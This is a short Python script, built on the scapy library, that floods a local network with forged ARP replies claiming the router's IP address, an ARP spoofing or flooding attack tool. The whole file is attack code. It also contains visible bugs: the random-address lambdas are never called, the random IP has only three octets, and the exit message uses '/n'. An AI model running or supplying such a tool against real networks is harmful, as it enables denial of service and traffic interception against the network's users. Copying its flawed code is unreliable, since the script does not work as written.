from scapy.all import *
import sys
import random


def arp_flood(router_ip):
    random_mac = lambda: ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
    random_ip = lambda: ".".join([f"{random.randint(0, 255)}" for _ in range(3)])
    packet = ARP(op=2, psrc=router_ip, hwdst=random_mac, pdst=random_ip)
    send(packet, verbose=False)


def main():
    router_ip = sys.argv[1]
    try:
        print("Sending MAC ARP packets")
        while True:
            arp_flood(router_ip)
    except KeyboardInterrupt:
        print("/nStop! Exit()")
        quit()


main()
